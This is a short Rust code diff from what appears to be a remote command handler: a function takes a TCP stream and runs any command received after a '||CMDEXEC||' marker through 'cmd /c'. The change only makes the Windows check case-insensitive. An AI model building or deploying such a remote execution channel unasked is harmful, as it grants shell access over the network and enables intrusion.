@@ -205,7 +205,7 @@ pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String, shared_secr
     let parts: Vec<&str> = command.splitn(2, "||CMDEXEC|| ").collect();
     let command = parts[1];
     let output: std::process::Output;
-    if os == "Windows" {
+    if os.to_lowercase() == "windows" {
         output = std::process::Command::new("cmd")
             .arg("/c")
             .arg(&command)
